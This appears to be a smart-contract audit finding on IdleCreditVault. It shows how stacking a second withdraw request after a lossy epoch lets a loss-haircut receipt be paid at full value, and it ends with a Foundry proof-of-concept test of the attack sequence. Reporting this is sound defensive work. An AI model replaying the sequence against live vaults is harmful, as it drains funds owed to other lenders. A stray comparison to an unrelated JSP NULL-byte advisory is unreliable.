### Title
A new `requestWithdraw` overwrites `lastWithdrawRequest`, orphaning a loss-adjusted receipt into the funded-claim bucket and letting it pay out at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
When `stopEpoch` realizes a loss, `collectWithdrawFunds` stores a haircut in `lossRecoveryPriceByEpoch[epochNumber]`. The only handle used to later apply that haircut is `lastWithdrawRequest[_user]`, which `requestWithdraw` overwrites on every new request. If a user makes a second withdraw request in the epoch after a loss epoch before claiming, `_claimLossAdjustedWithdrawRequest` looks up the wrong epoch key, finds price 0, and the orphaned epoch-N receipt is instead paid **unhaircutted** through `_claimFundedWithdrawRequest` — draining the funded reserve at the expense of other claimants.

### Finding Description
- `requestWithdraw` sets `lastWithdrawRequest[_user] = currentEpoch` unconditionally and adds the amount to `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][currentEpoch]` [1](#0-0) . The code comments themselves confirm stacking requests is intended behavior ("if a user does not claim a withdraw request and instead requests another withdraw, he will have to wait for another epoch to claim both requests") [2](#0-1) .
- On a lossy `stopEpochWithDuration`, `collectWithdrawFunds(_amount < pendingBasis)` zeroes `pendingWithdraws` and records `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` [3](#0-2) .
- `_claimLossAdjustedWithdrawRequest` derives the loss epoch solely from `lastWithdrawRequest[_user]` [4](#0-3) . `_clearWithdrawClaimForEpoch` is the only place that subtracts a per-epoch receipt from the `withdrawsRequests` aggregate and resets `lastWithdrawRequest` [5](#0-4) .
- Sequence: user requests withdraw in epoch N → `stopEpoch` applies loss, `lossRecoveryPriceByEpoch[N] = p < RECOVERY_FULL` → in epoch N+1 buffer the user calls `requestWithdraw` again → `lastWithdrawRequest[_user] = N+1` → after epoch N+1 is funded and `epochNumber > N+1`, `claimWithdrawRequest` runs: `_claimLossAdjustedWithdrawRequest` checks `lossRecoveryPriceByEpoch[N+1] == 0` and returns 0 without clearing epoch N's receipt; `_claimFundedWithdrawRequest` then pays the full `withdrawsRequests[_user]` (still containing the epoch-N basis) at par via `_transferFundedClaim` [6](#0-5) .

This mirrors the advisory's bug class: a stale/missing identifier check (URL NULL byte truncating the extension check → JSP source served raw; here the epoch key overwritten → haircut check bypassed and the receipt served at full price).

### Impact Explanation
Direct theft / insolvency of the funded-withdraw reserve. The strategy only received `_amount = basis * p` for the epoch-N pending bucket, but the attacker withdraws `basis` at par. The shortfall `(1 - p) * basis` is paid out of underlyings funded for other users' claims, so later legitimate `claimWithdrawRequest`/`claimInstantWithdrawRequest` calls revert on insufficient balance — permanent loss of unclaimed yield for honest users, quantified as the full haircut amount that was supposed to be socialized across epoch-N receipts. An attacker can scale this by sizing the epoch-N request arbitrarily (KYC'd lender with large tranche balance).

### Likelihood Explanation
Requires only unprivileged actions: two `requestWithdraw` calls in consecutive buffer periods sandwiching a lossy `stopEpoch`. Lossy stops are a designed feature (`previewLossAdjustedWithdrawFunds`, `stopEpochWithDuration`), not an edge case. No privileged actor misbehavior needed — the manager/borrower run the epoch machine honestly; the bug is purely in the per-epoch bookkeeping.

### Recommendation
Track the loss-adjusted epoch per user instead of relying on `lastWithdrawRequest`. Options:
- Store `lossRecoveryPriceByEpoch` claims against each epoch a user has receipts in: iterate `withdrawsRequestsByEpoch[_user]` keys, or keep a `lossEpochs[_user]` list set at `requestWithdraw`/`collectWithdrawFunds` time.
- Alternatively, revert in `requestWithdraw` if `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]] != 0` (force the user to claim/settle the haircutted receipt before stacking a new request), which preserves the single-slot design.

### Proof of Concept
```solidity
// test/foundry/IdleCreditVault.lossEpochOrphan.t.sol
// Setup: standard IdleCDOEpochVariant + IdleCreditVault, KYC'd attacker, epoch running.
function testLossReceiptPaidAtParAfterSecondRequest() external {
    // --- Epoch N: attacker requests withdraw ---
    cdoEpoch.startEpoch(); // manager
    uint256 tr = _depositWithUser(attacker, 1000e6);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(tr, address(tranche));
    uint256 lossEpoch = strategy.epochNumber(); // == lastWithdrawRequest[attacker]

    // --- stopEpoch N with a loss: borrower funds only p% of pendingWithdraws ---
    uint256 basis = strategy.pendingWithdraws();
    uint256 funded = basis * 50 / 100; // 50% haircut
    _borrowerFund(funded);
    cdoEpoch.stopEpoch(funded, /*duration*/ 30 days); // sets lossRecoveryPriceByEpoch[lossEpoch] = RECOVERY_FULL/2
    assertEq(strategy.lossRecoveryPriceByEpoch(lossEpoch), RECOVERY_FULL / 2);

    // --- Epoch N+1 buffer: attacker stacks a second request, overwriting lastWithdrawRequest ---
    _depositWithUser(attacker, 1e6);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(1e18, address(tranche)); // lastWithdrawRequest -> lossEpoch+1
    assertEq(strategy.lastWithdrawRequest(attacker), lossEpoch + 1);

    // --- Epoch N+1 funded normally; epochNumber advances past lastWithdrawRequest ---
    cdoEpoch.startEpoch();
    _borrowerFund(strategy.pendingWithdraws());
    cdoEpoch.stopEpoch(strategy.pendingWithdraws(), 30 days); // full funding, epochNumber now > lossEpoch+1

    // --- Attacker claims: loss path misses (price[lossEpoch+1]==0), funded path pays epoch-N basis at par ---
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(attacker) - balPre;

    // Attacker received basis (unhaircutted) + small epoch-N+1 receipt, but only basis*50% was funded for epoch N
    assertGt(got, funded, "epoch-N haircut bypassed; paid at par from other users' funded claims");
}
```
The excess `basis - funded` comes out of the strategy's funded reserve, so a subsequent honest `claimWithdrawRequest` for the same epoch bucket reverts or is underpaid — confirming insolvency of unclaimed funded claims.
